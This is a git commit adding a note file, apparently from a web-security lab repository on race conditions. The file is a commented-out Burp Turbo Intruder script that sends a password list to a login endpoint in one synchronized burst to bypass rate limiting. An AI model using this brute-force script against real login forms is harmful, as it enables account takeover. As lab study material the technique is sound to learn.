8a18f0730ad93421b9ebfd62b78aeeacd454a5ec
senior <jedi>
2023-08-19 22:09:17 +0530

    send to turbo intruder

---
+++ Race Conditions/Bypassing rate limits via race conditions/paysu.js
@@ -0,0 +1,30 @@
+/*
+turbo intruder capture and higlight password field
+
+def queueRequests(target, wordlists):
+
+    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    
+    # assign the list of candidate passwords from your clipboard
+    passwords = wordlists.clipboard
+    
+    # queue a login request using each password from the wordlist
+    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
+    for password in passwords:
+        engine.queue(target.req, password, gate='1')
+    
+    # once every request has been queued
+    # invoke engine.openGate() to send all requests in the given gate simultaneously
+    engine.openGate('1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+
+
+*/
